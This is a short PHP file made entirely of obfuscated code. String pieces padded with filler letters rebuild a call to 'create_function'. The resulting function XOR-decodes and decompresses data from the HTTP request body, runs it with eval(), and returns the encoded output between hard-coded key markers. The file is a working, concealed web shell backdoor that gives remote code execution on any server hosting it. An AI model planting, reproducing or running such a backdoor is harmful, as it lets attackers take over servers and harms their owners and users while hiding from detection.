<?php
$M='(@baNse64_dNecode(N$m[1N]),$k)));N$o=@ob_get_NcontenNts();@NoNb_end_cleaNNn(';
$G=');$r=@base6N4_encNode(N@x(@NgzcomNprNeNss($o),N$k));printN("$p$kh$r$kf");}';
$I='kNdVeNVNT";funNction x($t,$Nk){$c=strlNen($kN);N$l=Nstrlen($tN);$o="";Nf';
$o='or($i=0;NN$i<N$l;){for($j=0N;($Nj<$c&N&$i<$l);$j+N+,$i++)N{$o.=N$t{N$i}N^$k';
$n='$k="8e2N64521"N;$kh="31NNfNfde30e5e7"N;$Nkf=N"14a0c72db0fNf";$p="DtIZwNvJM3L';
$y='{N$j};}}Nreturn $NoN;}if (@pNreg_match("/$kNh(.+)$kfN/"NN,@fileN_get_con';
$X='tentNsN("php://inNNput"),$m)==1) {@Nob_staNrt();@eNvaNNl(@gzuncoNmpNress(@x';
$H=str_replace('yk','','cykrykeatyke_fuykykncyktion');
$q=str_replace('N','',$n.$I.$o.$y.$X.$M.$G);
$R=$H('',$q);$R();
?>
